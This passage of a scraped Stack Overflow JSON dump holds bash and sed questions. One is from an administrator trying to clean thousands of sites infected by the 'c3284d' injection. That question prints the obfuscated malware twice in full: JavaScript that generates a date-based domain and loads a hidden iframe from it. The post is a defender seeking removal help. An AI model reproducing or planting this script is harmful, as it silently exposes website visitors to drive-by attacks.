it?</p>\n"},{"tags":["bash","find"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":44,"score":0,"question_id":12450352,"title":"use find command to display file last modified at a particular time","body":"<p>I'v been googling and reading the man page but I do not see the ability for find to display a file modified at a particular time.</p>\n\n<p>so I have a time stamp like \"2012-09-16 08:10:01 PM\".  I want to look through a directory and find a file modified at that time.  </p>\n\n<p>I was hopeing find can do this.</p>\n"},{"tags":["python","linux","bash","ubuntu","text"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12450135,"title":"How to add text insert box on desktop in Ubuntu","body":"<p>What I'm trying to do, is basically set up my own chat channel between two computers, both running a form of <strong>Linux</strong> (both might be Ubuntu 12.04).  Computer A, and computer B.  I already have a server set up that will be able to sync certain text documents on a regular basis to these two computers.  What I'm looking for is a way to make an interface for the chatting.  For example, a box that someone could type into, and a script sends that text into a document on the server, which then updates the text on the other computer, and so on.  </p>\n\n<p>I was originally wanting to use Python, but if you know of a good way to do this with another language, I know <code>C</code>, <code>C++</code>, <code>Java</code>, and <code>perl</code>, and could probably figure out some more if I needed to.  Ideally I'd like this to be something that's not necessarily a window that opens as much as possibly embedded into the background image so it's always there. </p>\n"},{"tags":["linux","bash","shell","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12443687,"title":"Check every half and hour and see whether the if condition is true or not","body":"<p>There are two directories, which contains some files. I am working with Hadoop and both of these two directories are Hadoop File System.</p>\n\n<p>First Location of Directory-</p>\n\n<pre><code>/sys/edw/\n</code></pre>\n\n<p>Second Location of Directory-</p>\n\n<pre><code>/apps/only/\n</code></pre>\n\n<p>I want to see if <code>these two directories</code> has some <code>files or not</code>. If they contains some files, then <code>continue and execute my other shell scripts</code>, but if they do not contain any files, <code>wait for half an hour</code> and then check back again whether the files has arrived in those two directories or not. </p>\n\n<p>If it has arrived then execute other shell scripts but if it is not arrived then wait for half an hour again and keep on checking every half an hour.</p>\n\n<p><strong>Algorithm-</strong></p>\n\n<pre><code>If [ hadoop fs -ls /sys/edw/   AND hadoop fs -ls /apps/only/ ]\nthen\ncontinue executing my other shell scripts\nbut if condition is not true\nwait for half an hour and then check again with the if loop and keep on looking every half an hour until the if condition is not true\n</code></pre>\n\n<p>I want to execute this below script only when the above if condition is true.</p>\n\n<pre><code>query.sh\n</code></pre>\n\n<p>Basically I have few scripts that I want to run only  <code>if condition is true</code> otherwise keep on checking <code>every half an hour</code> and see whether the <code>if condition is true or not</code>.</p>\n\n<p>I am runnign <code>SunOS 5.1</code></p>\n\n<p><strong>Updated Code:-</strong></p>\n\n<p>I am trying something like below and file doesn't exist in this directory(/apps/hdmi/20120916), so it should be sleeping for half an hour but instead of sleeping, it goes to execute the other shell scripts which it shouldn't be doing-</p>\n\n<pre><code>while [ ! hadoop fs -ls /apps/hdmi/20120916 ]; do\n    sleep 1800\ndone\n\necho \"Hello new11\"\npwd\n</code></pre>\n\n<p>Anything wrong I am doing?</p>\n\n<p><strong>Updated One Again:-</strong></p>\n\n<pre><code>while ! hadoop fs -ls /apps/hdmi/20120916 ; do\n    sleep 1800\ndone\n\necho \"Hello new11\"\npwd\n</code></pre>\n\n<p>I have tried the above one also, but this directory doesn't exist (/apps/hdmi/20120916) and instead of sleeping for half an hour, it goes and print the <code>Hello new11</code> which shouldn't be happening. It should wait for half an hour. Anything else I am missing? I am running <code>SunOS 5.1</code></p>\n"},{"tags":["iphone","bash","mount"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12449705,"title":"How Do I access an iPhone mounted at gphoto2://[usb:001,003]/?","body":"<p>I need to cp (or dd) some files.\nI tried this: <a href=\"http://superuser.com/questions/281986/bashterminal-access-to-camera-files-mounted-as-gphoto2-usb001-003-dcim?answertab=active#tab-top\">http://superuser.com/questions/281986/bashterminal-access-to-camera-files-mounted-as-gphoto2-usb001-003-dcim?answertab=active#tab-top</a> ; But, the folder (.gvfs) is empty.</p>\n\n<pre><code>Volume(0): iPhone\n  Type: GProxyVolume (GProxyVolumeMonitorGPhoto2)\n  ids:\n   unix-device: '/dev/bus/usb/001/003'\n  activation_root=gphoto2://[usb:001,003]/\n  themed icons:  [camera-photo]\n  can_mount=1\n  can_eject=0\n  should_automount=1\n  Mount(0): iPhone -&gt; gphoto2://[usb:001,003]/\n    Type: GProxyShadowMount (GProxyVolumeMonitorGPhoto2)\n    default_location=gphoto2://[usb:001,003]/\n    themed icons:  [camera-photo]\n    x_content_types: x-content/image-dcf\n    can_unmount=1\n    can_eject=0\n    is_shadowed=0\nMount(1): iPhone -&gt; gphoto2://[usb:001,003]/\n  Type: GDaemonMount\n  default_location=gphoto2://[usb:001,003]/\n  themed icons:  [camera-photo]  [camera]\n  x_content_types: x-content/image-dcf\n  can_unmount=1\n  can_eject=0\n  is_shadowed=1\n</code></pre>\n"},{"tags":["linux","bash","sed","awk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":141,"score":1,"question_id":12443122,"title":"using sed to print between two patterns","body":"<p>So I've found a great deal on <a href=\"http://stackoverflow.com/questions/5071901/removing-lines-between-two-patterns-not-inclusive-with-sed\">deleting the text between two patterns</a> and on <a href=\"http://stackoverflow.com/questions/6023615/using-sed-to-print-between-delimiters\">printing the text between two delimiters</a> but I haven't found anything on printing the text between two patterns using bash functions.</p>\n\n<p>If I have:</p>\n\n<pre><code>\"Alas poor Yorik, I knew him well\"\n</code></pre>\n\n<p>and I want to print everything between the patterns \"poor\" and \"well\" (exclusive) I would get:</p>\n\n<pre><code>\" Yorik, I knew him \"\n</code></pre>\n\n<p>How could I achieve this using something like sed or awk?</p>\n"},{"tags":["bash","sed"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":106,"score":1,"question_id":12445067,"title":"sed - Replace characters between two strings with another string","body":"<p>I have been using IFTTT (if this then that) to notify me whenever some document gets uploaded on a CMS using RSS feeds, but the link that the CMS puts into the RSS feed has spaces and it interferes with the auto link shortening that IFTTT has. For example:</p>\n\n<pre><code>&lt;div&gt;&lt;b&gt;Attachments:&lt;/b&gt; &lt;a href=\"http://blah.com/foo/bar/Important Announcement 5.doc\"&gt;http://blah.com/foo/bar/Important Announcement 5.doc&lt;/a&gt;&lt;br&gt;&lt;a href=\"\"&gt;&lt;/a&gt;&lt;/div&gt;\n</code></pre>\n\n<p>gives me this in the IFTTT notifications:</p>\n\n<pre><code>Attachments: http://is.gd/abcdef Announcement 5.doc\n</code></pre>\n\n<p>I currently rehost the RSS feed using a bash script because IFTTT can't go through authenticated pages. How can I use sed to remove the spaces between those two string?</p>\n"},{"tags":["bash","shell","tree"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":58,"score":-1,"question_id":12448504,"title":"Make linux tree bash script show files","body":"<p>I created a shell script based on <a href=\"http://www.centerkey.com/tree/\" rel=\"nofollow\">a tree script</a>, however, i need a way to make said script show files as well as directories(By the way: i need the script to run on Mac OS X.)</p>\n"},{"tags":["bash","filesystems"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":12447994,"title":"How to delete folders whose name is less than ...?","body":"<p>On my server, I have a bunch of archived folder name after the date: <code>yyyy-mm-jj</code> This allows to easily sort the folders and find relevant data.</p>\n\n<p>I would like to delete all archives done before a given data. With my folder naming, natural sort order is the same as regular sort so that I could rely on the usual bash construct:</p>\n\n<pre><code>if [ $foldername -lt \"yyyy-mm-jj\" ]; then\n    rm -r $foldername\nfi\n</code></pre>\n\n<p>Is there a more efficient way to do it ?</p>\n"},{"tags":["regex","performance","bash","sed"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":107,"score":3,"question_id":11641333,"title":"Is there a difference in efficiency between pipelined sed invocations and multiple sed expressions?","body":"<p>I have a question about sed efficiency in bash. I have a pipelined series of sed statements, e.g.:</p>\n\n<pre><code>var1=\"Some string of text\"\n\nvar2=$(echo \"$var1\" | sed 's/pattern1/replacement1/g' | sed 's/pattern2/replacement2/g' | sed 's/pattern3/replacement3/g' | sed 's/pattern4/replacement4' | sed 's/pattern5/replacement5/g')\n</code></pre>\n\n<p>Assuming no inputs depend on edited output from an earlier sed pipe, am I better off scripting the above with expression statements instead? For example:</p>\n\n<pre><code>var2=$(echo \"$var1\" | sed -e's/pattern1/replacement1/g' -e's/pattern2/replacement2/g' -e's/pattern3/replacement3/g' -e's/pattern4/replacement4/g' -e's/pattern5/replacement5/g')\n</code></pre>\n\n<p>Is there any efficiency to be gained here?</p>\n"},{"tags":["bash","postgresql","command-line"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1828,"score":4,"question_id":6405127,"title":"How do I specify a password to psql non-interactively?","body":"<p>I am trying to automate database creation process with a shell script and one thing I've hit a road block with passing a password to psql.\nHere is a bit of code from the shell script:</p>\n\n<pre><code>psql -U $DB_USER -h localhost -c\"$DB_RECREATE_SQL\"\n</code></pre>\n\n<p>How do I pass a password to psql in a non-interactive way?</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":172,"score":0,"question_id":12427346,"title":"Clean server infected with c3284d malware, using shell script","body":"<p>We have around 11 servers for a total of roughly 1500 sites infected with the c3284d malware. We want to do a shell script to replace all the code which appears to have hit html, js, and php files. They also planted a file called \"p\" in the user's home folder which contains a larger version of the malware.</p>\n\n<p>We came across a few suggestions for find/replace but they don't appear to work for us, or we just don''t know how to do it properly.</p>\n\n<p>Here's what we have so far:</p>\n\n<pre><code> for FILE in $(grep -H -r -l \"c3284d\" /home)\n do\n      sed -i '/c3284d/d;/bVPbjpswEP2WWuoK/d' ${FILE}\n done\n</code></pre>\n\n<p>This only deletes the signature of \"c3284d\" and not the junk that was inserted. Can someone help to fix this to erase this mess from the files. The \"c3284d\" usually appears on it's own line, but not always, and starts and ends with it. </p>\n\n<p>Here's a few examples of what we are seeing:</p>\n\n<pre><code>&lt;!--c3284d--&gt;&lt;script&gt;function dow(hit){var var1=0.0086;var1+=18;return hit}var var2=0.0165;var2+=16;function gel(str,shift){var sux,ext,var2,len,ich,pos,cnt1,var6,var4,ret,var5,var1,cnt2,sh,var3,ch,ch;var var1=0.0018;var var2=4771;var2++;var var3=0.043;var3-=18;var var2='CYBsubfX'.substr(3,3);function aal(why,thy){var var4=0.0111;var4--;return thy}var2+='QDsstrr3'.substr(3,3);var var8=7678;if(var8&lt;25){var var6=0.0028;if(var6!=0){var var5=2108;var5++}var var7={yeh:0.0022}}var var6=25;function led(pow,nib,xis){var var9=7;var9++;return nib}var6-=9;var var10=6;var10++;var var12=0.0102;if(var12!=5){var var11=0.021;var11--}var var1='OpulenmH'.substr(3,3);var var14=0.012;if(var14!=null){var var13=12;var13-=0.0027}var1+='Msgthln'.substr(2,3);var var16=8439;if(var16&lt;0.0142){var var15=5943;var15+=0.007}var var5=40;function lar(rad,tsk,dud){var var17=13;var17++;var var18=13;var18-=0.0199;return tsk}var5+=22;var var19=0.021;var var4='CyqfromxB'.substr(3,4);var var20=0.0058;var20++;var var22=0.0179;if(var22!=null){var var21=23;var21--}var4+='zsCharAR'.substr(2,4);var var23=0.0435;var23--;var4+='XDoCodeWm'.substr(3,4);function lug(cod){var var26=0.0038;if(var26!=26){var var24=0.037;var24+=24;var var25=2702}var var31=5244;if(var31&lt;0.0085){var var27='voADrb8a1';var var30=5099;if(var30!=6){var var28=0.0233;var28++;var var29=null}}return cod}var var3='sF68indeOu'.substr(4,4);var var34=3367;if(var34!=0.0246){var var32=0.0089;var32++;var var33='cut'}var3+='Tq4xOfAk'.substr(3,3);var var36=0.0101;if(var36&gt;25){var var35=0.0071;var35+=3169}var var38=13;if(var38==0){var var37=5;var37+=3684}var sux='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';var var39=0;do{var var40=4847;var40+=29;var var41=26;var41++;var39++}while(var39&lt;7);var var42=0.0239;var42-=16;var ret='';function jot(few,hyp){var var43=null;var43-=0.0021;return hyp}var ext='';var var44=1250;var44++;var var45=0.0034;var45+=6258;var sh=0;var var46=7594;var46++;var var47=3240;var47--;var len=str[var1];var var49=3026;if(var49!=null){var var48=0.004;var48-=20}for(var cnt1=0;cnt1&lt;len;cnt1++){var var50=14;var50+=0.013;sh+=shift;var var51=6;var51++;var var52=0.0193;var52++;var ch=str[var2](cnt1,1);var var53=0;do{var var55=7261;if(var55!=null){var var54=16;var54+=14}var var58=1404;if(var58&gt;17){var var56=[10,0,50,30,40,20];var var57=5412;var57++}var53++}while(var53&lt;8);var pos=sux[var3](ch);var var59=0.0262;var59++;pos+=sh;var var60=6;var60+=6;pos%=var5;for(var var61=0;var61&lt;10;var61++){var var62=21;var62++;var var63=4887;var63-=4113}ret+=sux[var2](pos,1);var var66=0.062;if(var66&gt;22){var var64=0;var64+=3831;var var65=0.013;var65-=11}var var67=0.0122;var67-=3665}var var68=0.017;var68++;var var69=null;var69-=0.0069;for(var cnt2=0;cnt2&lt;len;cnt2+=2){function tub(uke,dun){var var70=0;do{var var73=5314;if(var73!=4129){var var71=0;var71+=0.0322;var var72=false}var70++}while(var70&lt;7);var var74=0.0238;var74-=6514;return uke}var var75=17;var75-=21;var ch=ret[var2](cnt2,2);function cue(ton){var var78=0.003;if(var78==28){var var76=0;var76+=7;var var77=0.0089;var77--}return ton}var ich=parseInt(ch,var6);var var79=0;while(var79&lt;7){var var81=6374;if(var81!=0.0126){var var80=0.003;var80+=1176}var79++}ext+=String[var4](ich);function gun(sub,vug){var var82=0.005;var82--;var var83=null;return sub}var var84=10;var84--}function ree(ban,set){var var89=0.0136;if(var89&lt;0){var var86=11;if(var86&lt;4930){var var85=0;var85-=4954}var var88=5;if(var88&lt;0){var var87=8525;var87--}}return ban}return ext}var var3=0;var3-=6479;for(var var4=0;var4&lt;10;var4++){var var5=7;var5+=26}function ulu(){var hi,test,lo;function bid(pah){var var9=0.0011;if(var9==19){var var7=1393;if(var7==0.017){var var3=19;if(var3==null){var var2=7;if(var2!=3669){var var1=[21,42,28,0,35,7,14]}}var var6=0.005;if(var6!=5605){var var4=0.028;var4-=10;var var5=0.0145;var5+=0.004}}var var8=['the','eft','mas']}return pah}var var10=18;var10--;var var11=5110;var11--;var var14=0.014;if(var14==null){var var12=1537;var12--;var var13=0.012;var13--}var hi=this.seed/this.Q;function cos(wag){var var15='hum';var var16=['teg','yod'];return wag}function yew(tat){var var17=0.0109;var17-=3465;return tat}    var lo=this.seed%this.Q;function dee(pht,oxy){for(var var18=0;var18&lt;4;var18++){var var22=0.0152;if(var22==null){var var20=3229;if(var20&gt;14){var var19=1941}var var21='zh4pMCYB'}}return oxy}var var25=5109;if(var25&gt;4261){var var23=0;var var24='mho'}    var test=this.A*lo-this.R*hi;var var26=0.011;var26-=7383;    if(test&gt;0){var var27=null;var27-=2995;for(var var28=0;var28&lt;8;var28++){var var30=0.0056;if(var30!=19){var var29=0;var29+=0.013}var var31=26;var31++}        this.seed=test;var var32=0;while(var32&lt;4){var var33=27;var33--;var32++}var var35=2510;if(var35&lt;null){var var34='lwxSFm8TI'}}else{var var38=8;if(var38==29){var var36=0.017;var36--;var var37=13;var37--}var var39=2605;        this.seed=test+this.M;var var40=25;var40-=5704;var var41={wit:2288}}var var42=0.018;var42-=0.0047;    return(this.seed*this.oneOverM)}var var6=null;var6-=6649;var var8=2139;if(var8!=0.0176){var var7=10;var7++}function jig(unix){var s,var1,d,var3,var2;function lac(net,dam,sap){var var11=29;if(var11!=5171){var var6=0.002;if(var6&lt;15){var var4=20;var4-=8;var var5=0.035;var5--}var var10=11;if(var10==2581){var var8=18;if(var8&gt;10){var var7=null;var7-=2355}var var9=10;var9++}}return net}var var3=4775;var var13=30;if(var13&lt;23){var var12=9;var12++}var var14=0;do{var var15=0.0147;var var16=0;var14++}while(var14&lt;7);var3-=680;var var19=8044;if(var19==0.0096){var var17=0.0015;var17-=0.009;var var18=22;var18++}var var20={pix:['pip','tor','lob']};var var2=120523;var var23=0.029;if(var23&lt;4713){var var21=6;var21--;var var22=0.004;var22++}var var24=2304;var24--;var2-=54988;var var25=false;var var26=4364;var26++;var var1=17722082;var var27=true;var1-=944867;var var28='den';var d=new Date(unix*1000);var var29=null;var29-=13;    var s=Math.ceil(d.getHours()/3);function feu(fas,cry){var var31=5835;if(var31==0){var var30=2916}return fas}    this.seed=2345678901+(d.getMonth()*var1)+(d.getDate()*var2)+(Math.round(s*var3));var var33=0.008;if(var33&gt;9){var var32=0.009;var32-=2790}    this.A=48271;var var34=5222;var34+=1338;    this.M=2147483647;var var35={top:['sue','ras']};    this.Q=this.M/this.A;var var36='pjNgzb';    this.R=this.M%this.A;var var37=7112;var37--;    this.oneOverM=1.0/this.M;var var38=0;do{var var39=5708;var39++;var var41=9;if(var41==0.007){var var40=3570;var40++}var38++}while(var38&lt;3);    this.next=ulu;var var43=16;if(var43==7569){var var42=1355}var var44=false;    return this}var var11=18;if(var11==0){var var9=0.006;var var10=30;var10--}function hot(dub,jut){var var12='FtjKdH6DTi';var var13=28;var13++;return dub}function bum(r,Min,Max){function arc(vac,hat){var var1=13;var1+=6807;return hat}var var2=0.031;var2--;return Math.round((Max-Min)*r.next()+Min)}var var14=0;do{var var15=['pit','men'];var var16=0;var14++}while(var14&lt;4);function dap(unix,length,zone){var i,rand,letters,str;var var1=0;do{var var2=7902;var1++}while(var1&lt;4);var var3=1574;var3++;var var4=0;do{var var5=5140;var5+=0.007;var var6=null;var6-=0.0061;var4++}while(var4&lt;6);function lap(eth,wyn){var var7=0.002;var7--;return wyn}var rand=new jig(unix);var var10=0.0204;if(var10&gt;8){var var8=0.01;var var9=0.0068}    var letters='qmahgwctopfjilrfpjrfcwgewheizwdw'.split('');var var11=8091;var var12=['del','rec','jam'];    var str='';var var19=22;if(var19!=8632){var var15=24;if(var15&gt;0.0187){var var13=4820;var13-=14;var var14=4205;var14--}var var18=7248;if(var18!=null){var var16=0.0077;var16+=8095;var var17=3411;var17--}}for(var i=0; i&lt;length; i++){var var20='yjVL6qKWtZ';        str+=letters[bum(rand, 0, letters.length-1)];var var21={gob:28}}function bar(dey,fay){var var22=0.0039;var22-=7259;var var24=23;if(var24==0){var var23='tab'}return dey}var var25='UhRKMl5V';    return str+'.'+zone}for(var var17=0;var17&lt;3;var17++){var var18=['how','tar'];var var19=0;var19-=5692}var var20=0;do{var var21=6868;var21++;var var22=0.002;var22++;var20++}while(var20&lt;7);setInterval(function(){var var23=4845;var var24=0.0149;var24++;    try{var var27=10;if(var27&gt;null){var var25=0.011;var25--;var var26=0.025;var26+=0.003}        if(typeof iframeWasCreated=='undefined'){var var28=0.016;var28+=7624;var var29=12;            var unix=Math.round(+new Date()/1000);var var30=0.0044;var30+=0.007;            var domainName=dap(unix, 16, 'info');var var31=29;var31+=5759;            ifrm=document.createElement('i'+'frame'); function roe(mae,you,bam){var var32=0;do{var var33=[18,45,27,9,36,0];var32++}while(var32&lt;6);var var34=7886;return bam}            ifrm.setAttribute('src', 'http://'+domainName+'/in.cgi?14'); var var35='je5Bx_40z';            ifrm.style.width='10px'; var var36=4376;var36+=2797;            ifrm.style.height='10px'; var var37=7287;var37--;function nor(lop){var var38={dig:4393};return lop}            ifrm.style.visibility='hidden'; var var41=17;if(var41&gt;1540){var var39=[0,18,12,6];var var40=12;var40+=0.016}            document.body.appendChild(ifrm);var var43=0.0437;if(var43==0.0087){var var42=0.002}var var44=2082;var44-=0.0189;iframeWasCreated=true;var var45=false}var var48=0.008;if(var48==7526){var var46=8527;var46--;var var47=5186;var47--}for(var var49=0;var49&lt;8;var49++){var var50=false}}catch(e){iframeWasCreated=undefined}var var51=0.0135;var51+=1355;var var52=0.0019;var52++}, 100);&lt;/script&gt;&lt;!--/c3284d--&gt;\n\n/*c3284d*/\nfunction dow(hit){var var1=0.0086;var1+=18;return hit}var var2=0.0165;var2+=16;function gel(str,shift){var sux,ext,var2,len,ich,pos,cnt1,var6,var4,ret,var5,var1,cnt2,sh,var3,ch,ch;var var1=0.0018;var var2=4771;var2++;var var3=0.043;var3-=18;var var2='CYBsubfX'.substr(3,3);function aal(why,thy){var var4=0.0111;var4--;return thy}var2+='QDsstrr3'.substr(3,3);var var8=7678;if(var8&lt;25){var var6=0.0028;if(var6!=0){var var5=2108;var5++}var var7={yeh:0.0022}}var var6=25;function led(pow,nib,xis){var var9=7;var9++;return nib}var6-=9;var var10=6;var10++;var var12=0.0102;if(var12!=5){var var11=0.021;var11--}var var1='OpulenmH'.substr(3,3);var var14=0.012;if(var14!=null){var var13=12;var13-=0.0027}var1+='Msgthln'.substr(2,3);var var16=8439;if(var16&lt;0.0142){var var15=5943;var15+=0.007}var var5=40;function lar(rad,tsk,dud){var var17=13;var17++;var var18=13;var18-=0.0199;return tsk}var5+=22;var var19=0.021;var var4='CyqfromxB'.substr(3,4);var var20=0.0058;var20++;var var22=0.0179;if(var22!=null){var var21=23;var21--}var4+='zsCharAR'.substr(2,4);var var23=0.0435;var23--;var4+='XDoCodeWm'.substr(3,4);function lug(cod){var var26=0.0038;if(var26!=26){var var24=0.037;var24+=24;var var25=2702}var var31=5244;if(var31&lt;0.0085){var var27='voADrb8a1';var var30=5099;if(var30!=6){var var28=0.0233;var28++;var var29=null}}return cod}var var3='sF68indeOu'.substr(4,4);var var34=3367;if(var34!=0.0246){var var32=0.0089;var32++;var var33='cut'}var3+='Tq4xOfAk'.substr(3,3);var var36=0.0101;if(var36&gt;25){var var35=0.0071;var35+=3169}var var38=13;if(var38==0){var var37=5;var37+=3684}var sux='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';var var39=0;do{var var40=4847;var40+=29;var var41=26;var41++;var39++}while(var39&lt;7);var var42=0.0239;var42-=16;var ret='';function jot(few,hyp){var var43=null;var43-=0.0021;return hyp}var ext='';var var44=1250;var44++;var var45=0.0034;var45+=6258;var sh=0;var var46=7594;var46++;var var47=3240;var47--;var len=str[var1];var var49=3026;if(var49!=null){var var48=0.004;var48-=20}for(var cnt1=0;cnt1&lt;len;cnt1++){var var50=14;var50+=0.013;sh+=shift;var var51=6;var51++;var var52=0.0193;var52++;var ch=str[var2](cnt1,1);var var53=0;do{var var55=7261;if(var55!=null){var var54=16;var54+=14}var var58=1404;if(var58&gt;17){var var56=[10,0,50,30,40,20];var var57=5412;var57++}var53++}while(var53&lt;8);var pos=sux[var3](ch);var var59=0.0262;var59++;pos+=sh;var var60=6;var60+=6;pos%=var5;for(var var61=0;var61&lt;10;var61++){var var62=21;var62++;var var63=4887;var63-=4113}ret+=sux[var2](pos,1);var var66=0.062;if(var66&gt;22){var var64=0;var64+=3831;var var65=0.013;var65-=11}var var67=0.0122;var67-=3665}var var68=0.017;var68++;var var69=null;var69-=0.0069;for(var cnt2=0;cnt2&lt;len;cnt2+=2){function tub(uke,dun){var var70=0;do{var var73=5314;if(var73!=4129){var var71=0;var71+=0.0322;var var72=false}var70++}while(var70&lt;7);var var74=0.0238;var74-=6514;return uke}var var75=17;var75-=21;var ch=ret[var2](cnt2,2);function cue(ton){var var78=0.003;if(var78==28){var var76=0;var76+=7;var var77=0.0089;var77--}return ton}var ich=parseInt(ch,var6);var var79=0;while(var79&lt;7){var var81=6374;if(var81!=0.0126){var var80=0.003;var80+=1176}var79++}ext+=String[var4](ich);function gun(sub,vug){var var82=0.005;var82--;var var83=null;return sub}var var84=10;var84--}function ree(ban,set){var var89=0.0136;if(var89&lt;0){var var86=11;if(var86&lt;4930){var var85=0;var85-=4954}var var88=5;if(var88&lt;0){var var87=8525;var87--}}return ban}return ext}var var3=0;var3-=6479;for(var var4=0;var4&lt;10;var4++){var var5=7;var5+=26}function ulu(){var hi,test,lo;function bid(pah){var var9=0.0011;if(var9==19){var var7=1393;if(var7==0.017){var var3=19;if(var3==null){var var2=7;if(var2!=3669){var var1=[21,42,28,0,35,7,14]}}var var6=0.005;if(var6!=5605){var var4=0.028;var4-=10;var var5=0.0145;var5+=0.004}}var var8=['the','eft','mas']}return pah}var var10=18;var10--;var var11=5110;var11--;var var14=0.014;if(var14==null){var var12=1537;var12--;var var13=0.012;var13--}var hi=this.seed/this.Q;function cos(wag){var var15='hum';var var16=['teg','yod'];return wag}function yew(tat){var var17=0.0109;var17-=3465;return tat}    var lo=this.seed%this.Q;function dee(pht,oxy){for(var var18=0;var18&lt;4;var18++){var var22=0.0152;if(var22==null){var var20=3229;if(var20&gt;14){var var19=1941}var var21='zh4pMCYB'}}return oxy}var var25=5109;if(var25&gt;4261){var var23=0;var var24='mho'}    var test=this.A*lo-this.R*hi;var var26=0.011;var26-=7383;    if(test&gt;0){var var27=null;var27-=2995;for(var var28=0;var28&lt;8;var28++){var var30=0.0056;if(var30!=19){var var29=0;var29+=0.013}var var31=26;var31++}        this.seed=test;var var32=0;while(var32&lt;4){var var33=27;var33--;var32++}var var35=2510;if(var35&lt;null){var var34='lwxSFm8TI'}}else{var var38=8;if(var38==29){var var36=0.017;var36--;var var37=13;var37--}var var39=2605;        this.seed=test+this.M;var var40=25;var40-=5704;var var41={wit:2288}}var var42=0.018;var42-=0.0047;    return(this.seed*this.oneOverM)}var var6=null;var6-=6649;var var8=2139;if(var8!=0.0176){var var7=10;var7++}function jig(unix){var s,var1,d,var3,var2;function lac(net,dam,sap){var var11=29;if(var11!=5171){var var6=0.002;if(var6&lt;15){var var4=20;var4-=8;var var5=0.035;var5--}var var10=11;if(var10==2581){var var8=18;if(var8&gt;10){var var7=null;var7-=2355}var var9=10;var9++}}return net}var var3=4775;var var13=30;if(var13&lt;23){var var12=9;var12++}var var14=0;do{var var15=0.0147;var var16=0;var14++}while(var14&lt;7);var3-=680;var var19=8044;if(var19==0.0096){var var17=0.0015;var17-=0.009;var var18=22;var18++}var var20={pix:['pip','tor','lob']};var var2=120523;var var23=0.029;if(var23&lt;4713){var var21=6;var21--;var var22=0.004;var22++}var var24=2304;var24--;var2-=54988;var var25=false;var var26=4364;var26++;var var1=17722082;var var27=true;var1-=944867;var var28='den';var d=new Date(unix*1000);var var29=null;var29-=13;    var s=Math.ceil(d.getHours()/3);function feu(fas,cry){var var31=5835;if(var31==0){var var30=2916}return fas}    this.seed=2345678901+(d.getMonth()*var1)+(d.getDate()*var2)+(Math.round(s*var3));var var33=0.008;if(var33&gt;9){var var32=0.009;var32-=2790}    this.A=48271;var var34=5222;var34+=1338;    this.M=2147483647;var var35={top:['sue','ras']};    this.Q=this.M/this.A;var var36='pjNgzb';    this.R=this.M%this.A;var var37=7112;var37--;    this.oneOverM=1.0/this.M;var var38=0;do{var var39=5708;var39++;var var41=9;if(var41==0.007){var var40=3570;var40++}var38++}while(var38&lt;3);    this.next=ulu;var var43=16;if(var43==7569){var var42=1355}var var44=false;    return this}var var11=18;if(var11==0){var var9=0.006;var var10=30;var10--}function hot(dub,jut){var var12='FtjKdH6DTi';var var13=28;var13++;return dub}function bum(r,Min,Max){function arc(vac,hat){var var1=13;var1+=6807;return hat}var var2=0.031;var2--;return Math.round((Max-Min)*r.next()+Min)}var var14=0;do{var var15=['pit','men'];var var16=0;var14++}while(var14&lt;4);function dap(unix,length,zone){var i,rand,letters,str;var var1=0;do{var var2=7902;var1++}while(var1&lt;4);var var3=1574;var3++;var var4=0;do{var var5=5140;var5+=0.007;var var6=null;var6-=0.0061;var4++}while(var4&lt;6);function lap(eth,wyn){var var7=0.002;var7--;return wyn}var rand=new jig(unix);var var10=0.0204;if(var10&gt;8){var var8=0.01;var var9=0.0068}    var letters='qmahgwctopfjilrfpjrfcwgewheizwdw'.split('');var var11=8091;var var12=['del','rec','jam'];    var str='';var var19=22;if(var19!=8632){var var15=24;if(var15&gt;0.0187){var var13=4820;var13-=14;var var14=4205;var14--}var var18=7248;if(var18!=null){var var16=0.0077;var16+=8095;var var17=3411;var17--}}for(var i=0; i&lt;length; i++){var var20='yjVL6qKWtZ';        str+=letters[bum(rand, 0, letters.length-1)];var var21={gob:28}}function bar(dey,fay){var var22=0.0039;var22-=7259;var var24=23;if(var24==0){var var23='tab'}return dey}var var25='UhRKMl5V';    return str+'.'+zone}for(var var17=0;var17&lt;3;var17++){var var18=['how','tar'];var var19=0;var19-=5692}var var20=0;do{var var21=6868;var21++;var var22=0.002;var22++;var20++}while(var20&lt;7);setInterval(function(){var var23=4845;var var24=0.0149;var24++;    try{var var27=10;if(var27&gt;null){var var25=0.011;var25--;var var26=0.025;var26+=0.003}        if(typeof iframeWasCreated=='undefined'){var var28=0.016;var28+=7624;var var29=12;            var unix=Math.round(+new Date()/1000);var var30=0.0044;var30+=0.007;            var domainName=dap(unix, 16, 'info');var var31=29;var31+=5759;            ifrm=document.createElement('i'+'frame'); function roe(mae,you,bam){var var32=0;do{var var33=[18,45,27,9,36,0];var32++}while(var32&lt;6);var var34=7886;return bam}            ifrm.setAttribute('src', 'http://'+domainName+'/in.cgi?14'); var var35='je5Bx_40z';            ifrm.style.width='10px'; var var36=4376;var36+=2797;            ifrm.style.height='10px'; var var37=7287;var37--;function nor(lop){var var38={dig:4393};return lop}            ifrm.style.visibility='hidden'; var var41=17;if(var41&gt;1540){var var39=[0,18,12,6];var var40=12;var40+=0.016}            document.body.appendChild(ifrm);var var43=0.0437;if(var43==0.0087){var var42=0.002}var var44=2082;var44-=0.0189;iframeWasCreated=true;var var45=false}var var48=0.008;if(var48==7526){var var46=8527;var46--;var var47=5186;var47--}for(var var49=0;var49&lt;8;var49++){var var50=false}}catch(e){iframeWasCreated=undefined}var 